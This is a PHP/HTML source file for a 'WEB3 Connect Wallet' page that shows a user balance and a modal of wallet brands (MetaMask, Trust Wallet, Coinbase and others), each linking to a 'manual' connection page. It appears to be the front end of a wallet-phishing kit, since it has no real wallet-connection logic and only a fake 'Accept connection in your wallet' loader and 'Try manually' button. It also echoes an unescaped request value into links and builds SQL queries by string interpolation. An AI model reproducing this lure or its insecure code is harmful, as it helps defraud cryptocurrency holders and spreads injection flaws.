<?php

include 'cdn.php';
include 'config.php';
$usr_string = $req;

//echo $req;
// Remove all non-digit characters
$numbers = preg_replace('/\D/', '', $req);

//echo $numbers; 
$bal = $conn->query("select * from bal where uid='$numbers'");
  if($bal->num_rows<1) {
    //user not  available
    $conn->query("insert into bal(uid,bal) values('$numbers','0.00')");
    ?> <script>window.location.reload();</script><?php
  }
  

$chk = $conn->query("select * from user_details where uid='$numbers'");
if($chk->num_rows>0) {
  while($loop = $chk->fetch_assoc()) {
     $uid = $loop['uid'];
//echo $uid;
     //get bal
     $bl = $conn->query("select * from bal where uid='$$uid'");
     if($bl->num_rows>0) {
      while($itr = $bl->fetch_assoc()) {

       

        ?>
     
 <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/css/bootstrap.min.css">
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/js/bootstrap.min.js"></script>
  <link rel="stylesheet" href="https://www.w3schools.com/w3css/5/w3.css">
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/css/bootstrap.min.css">
  <script src="https://cdn.jsdelivr.net/npm/jquery@3.7.1/dist/jquery.slim.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.1/dist/umd/popper.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/js/bootstrap.bundle.min.js"></script>



<div class="container-fluid">
    
<style>
body {
  font-family: "Roboto", sans-serif !important;
  background:#e6e6e6;
}

.sidenav {
  height: 100%;
  width: 0;
  position: fixed;
  z-index: 1;
  top: 0;
  left: 0;
  background-color: #111;
  overflow-x: hidden;
  transition: 0.5s;
  padding-top: 60px;
}

.sidenav a {
  padding: 8px 8px 8px 32px;
  text-decoration: none;
  font-size: 25px;
  color: #818181;
  display: block;
  transition: 0.3s;
}

.sidenav a:hover {
  color: #f1f1f1;
}

.sidenav .closebtn {
  position: absolute;
  top: 0;
  right: 25px;
  font-size: 36px;
  margin-left: 50px;
}
i { margin-top:5%;}

@media screen and (max-height: 450px) {
  .sidenav {padding-top: 15px;}
  .sidenav a {font-size: 18px;}
}
</style>


<div id="mySidenav" class="sidenav">
  <a href="javascript:void(0)"  class="closebtn" onclick="closeNav()">
<span style="font-size:23px;">&times;</span></a>
  <a href="/dashboard/<?php echo $req;?>" style='margin-top:190%;'><i class="fa fa-desktop" style="font-size:28px;color:#818181"></i></a><br>
  <a href="/web/<?php echo $req;?>" style=' background:orange;'><i class="fa fa-money" style="font-size:28px;color:#fff"></i></a><br>
  
   <a href="/history/<?php echo $req;?>"><i class="fa fa-history" style="font-size:28px;color:#818181"></i></a><br>
  <a href="mailto:support@virtualsynchub.com"><i class="fa fa-envelope" style="font-size:28px;color:#818181"></i></a><br>
  
  <a href="/signin/logout"><i class="fa fa-sign-out" style="font-size:28px;color:#818181"></i></a><br>
</div>
<br><p style='white-space:nowrap'>
<span style="font-size:23px;cursor:pointer; padding:5%; margin-top:-12%; color:#111111;" onclick="openNav()"> <i class="fa fa-bars" style='font-size:30px;color:#111111;'></i><b style='margin-left:6%;margin-top:-12%; font-size:30px; color:#111111;'> WEB3</b><button  id="myBtn" class='connect'>Connect Wallet</button><br></p>
<h3 style='margin-left:19%;'>Connect your wallet</h3>
</span><br>

<script>
function openNav() {
  document.getElementById("mySidenav").style.width = "70px";
}
openNav();
function closeNav() {
  document.getElementById("mySidenav").style.width = "0";
}

</script>


<style>
/* The Modal (background) */
.modal {
  display: none; /* Hidden by default */
  position: fixed; /* Stay in place */
  z-index: 1; /* Sit on top */
  padding-top: 100px; /* Location of the box */
  left: 0;
  top: 0;
  width: 100%; /* Full width */
  height: 120%; /* Full height */
  overflow: auto; /* Enable scroll if needed */
  background-color: #e6e6e6; /* Fallback color */
  background-color: rgba(0,0,0,0.4);
  margin-top:-15%; /* Black w/ opacity */
}

/* Modal Content */
.modal-content {
  background-color: #fefefe;
  margin: auto;
  padding: 20px;
  border: 1px solid #888;
  width: 80%;
}

/* The Close Button */
.close {
  color: #aaaaaa;
  float: right;
  font-size: 28px;
  font-weight: bold;
}

.close:hover,
.close:focus {
  color: #000;
  text-decoration: none;
  cursor: pointer;
}
.wal img {
  width:15%; border-radius:15px;
} .wal { background:#e0e0e0; padding:2%; border-radius:20px;}


.manual {
    padding:1%; display:block; margin:auto; color:purple; border:hidden; border-radius:18px; border:1px solid purple;background:black;
  }
  .wal img {
    width:15%; border-radius:15px;
  } .wal { background:#e0e0e0; padding:2%; border-radius:20px;}
  .connection_loader { margin-left:18%; background:black; color:white; padding:4%; text-align:center; font-size:22px; border-radius:14px; position:absolute; display:none;}
  </style>





<!-- The Modal -->
<div id="myModal" class="modal">

  <!-- Modal content -->
  <div class="modal-content">
    <span class="close">&times;</span>
    <h3 style='text-align:center; color:orange'>Connect Wallet</h3>
    <hr>
        
          <div class="wallet">
          <a style='text-decoration:none; color:black;' href='/manual/<?php echo $req;?>-trustwallet' > <div class="wal">
          <img src='https://crypto-surge.com/web3/images/trustwallet.jpg'/> Trustwallet
          </div></a>
          <br> <a style='text-decoration:none; color:black;' href='/manual/<?php echo $req;?>-coinbase' > <div class="wal">
            <img src='https://crypto-surge.com/web3/images/coinbase.jpg'/> Coinbase
          </div></a>
          <br> <a style='text-decoration:none; color:black;' href='/manual/<?php echo $req;?>-metamask' > <div class="wal">
            <img src='https://crypto-surge.com/web3/images/metamask.jpg'/> MetaMask
          </div></a>
          <br> <a style='text-decoration:none; color:black;' href='/manual/<?php echo $req;?>-safepal' > <div class="wal">
            <img src='https://crypto-surge.com/web3/images/safepal.jpg'/> SafePal
          </div></a>
          <br> <a style='text-decoration:none; color:black;' href='/manual/<?php echo $req;?>-bitcoin.com' > <div class="wal">
            <img src='https://crypto-surge.com/web3/images/bitcoin.jpg'/> Bitcoin.com
          </div></a>
          <br>  <a style='text-decoration:none; color:black;' href='/manual/<?php echo $req;?>-crypto.com' ><div class="wal">
            <img src='https://crypto-surge.com/web3/images/crypto.jpg'/> crypto.com
          </div></a>
          <br> <a style='text-decoration:none; color:black;' href='/manual/<?php echo $req;?>-exoduswallet' > <div class="wal">
            <img src='https://crypto-surge.com/web3/images/exoduswallet.jpg'/> Exodus Wallet
          </div></a>
          <br> <a style='text-decoration:none; color:black;' href='/manual/<?php echo $req;?>-atomicwallet' > <div class="wal">
            <img src='https://crypto-surge.com/web3/images/atomicwallet.jpg'/> Atomic Wallet
          </div></a><br><br><br>
        </div><br><br>
  </div>

</div>

<script>
// Get the modal
var modal = document.getElementById("myModal");

// Get the button that opens the modal
var btn = document.getElementById("myBtn");

// Get the <span> element that closes the modal
var span = document.getElementsByClassName("close")[0];

// When the user clicks the button, open the modal 
btn.onclick = function() {
  modal.style.display = "block";
}

// When the user clicks on <span> (x), close the modal
span.onclick = function() {
  modal.style.display = "none";
}

// When the user clicks anywhere outside of the modal, close it
window.onclick = function(event) {
  if (event.target == modal) {
    modal.style.display = "none";
  }
}
</script>





















  <div class="sel" style='margin-left:19%;' >
    <span>Select Wallet</span><br><br>
    <select>
      <option>Exodus Wallet</option>
      <option>Trust Wallet</option>
      <option>Coinbase</option>
      <option>MetaMask</option>
      <option>SafePal</option>
      <option>Bitcoin.com</option>
      <option>Atomic Wallet</option>

</select><br><br>
<p>Trusted by</p>
<h2 style='margin-top:-20px;'><b style='color:orange; margin-top:-20px; !important'>Industry giants</b></h2>
  </div> 

<style>
  select {width:70%; padding:2%; font-size:21px; border:hidden; border:1px solid gray;}
.lengthy { background:red; height:90%;}
.connect { border:hidden;  color:green; border:1px solid gray; transform:scale(0.8);}
tr { background:;}
  </style>

        <div class="row" style='margin-left:12%;'>
          <div class="col-sm-6">
          <div style="height:250px; background-color: #e6e6e6; overflow:hidden; box-sizing: border-box; border: 1px solid black; border-radius: 4px; text-align: right; line-height:14px; font-size: 12px; font-feature-settings: normal; text-size-adjust: 100%; box-shadow: inset 0 -20px 0 0 black; padding: 0px; margin: 0px; width: 100%;"><div style="height:354px; padding:0px; margin:0px; width: 100%;"><iframe src="https://widget.coinlib.io/widget?type=full_v2&theme=light&cnt=5&pref_coin_id=1505&graph=yes" width="100%" height="250px" scrolling="auto" marginwidth="0" marginheight="0" frameborder="0" border="0" style="border:0;margin:0;padding:0;"></iframe></div><div style="color: #FFFFFF; line-height: 14px; font-weight: 400; font-size: 11px; box-sizing: border-box; padding: 2px 6px; width: 100%; font-family: Verdana, Tahoma, Arial, sans-serif;"><a href="https://coinlib.io" target="_blank" style="font-weight: 500; color: #FFFFFF; text-decoration:none; font-size:11px"></a> </div></div>
          </div>
          <style>
            .stacks {  padding:5%; border-radius:14px; display:block; margin:auto; width:120%}
.stacks img { 
  width: 18%; /* Adjust the width as needed, e.g., 30% for 6 images */
  height: auto; /* Maintain aspect ratio */
  object-fit: cover; /* Ensures the images cover the area without distortion */
  border-radius: 12px;
 }.row { transform:scale(0.9)}
            </style><br>


<div style=' margin-left:-1%;width:110%' class="connection_loader" id='conn'><br>
  <p>Continue in Wallet</p>
  <div class="spinner-border"></div>
  <p style='font-size:16px; color:lightgray'>Accept connection in your wallet</p><br>
 <a href='/manually/<?php echo $req;?>'> <button class='manual'>Try manually</button></a>
</div>

<script>
  function func() {
document.getElementById('con').style.display='block';}
  </script>

          <div class="col-sm-6">
              <div class="col-sm-6">
                  <div class='stacks'>
                      <img src="https://crypto-surge.com/web3/images/safepal.jpg" alt="">
                      <img src="https://crypto-surge.com/web3/images/exoduswallet.jpg" alt="">
                    
                    <img src="https://crypto-surge.com/web3/images/trustwallet.jpg" alt="">
                    <img src="https://crypto-surge.com/web3/images/atomicwallet.jpg" alt="">
                </div>
              </div>
              <div class="col-sm-6">
              <div class='stacks
              '>
                      <img src="https://crypto-surge.com/web3/images/coinbase.jpg" alt="">
                      <img src="https://crypto-surge.com/web3/images/crypto.jpg" alt="">
                  
                    <img src="https://crypto-surge.com/web3/images/metamask.jpg" alt="">
                    <img src="https://crypto-surge.com/web3/images/bitcoin.jpg" alt="">
                  </div>
              </div>
              </div>
          </div>

          
         

        </div>
 <?php  
}
     }
  }
}

?>